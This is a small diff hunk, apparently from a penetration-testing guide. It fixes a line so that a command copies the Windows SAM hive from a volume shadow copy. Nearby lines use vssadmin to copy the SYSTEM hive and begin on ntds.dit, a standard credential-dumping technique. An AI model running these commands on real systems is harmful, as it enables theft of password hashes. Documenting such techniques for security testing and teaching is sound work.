@@ -205,7 +205,7 @@ vssadmin binary is only available in Windows Server versions
 ```bash
 vssadmin create shadow /for=C:
 #Copy SAM
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
 #Copy SYSTEM
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
 #Copy ntds.dit
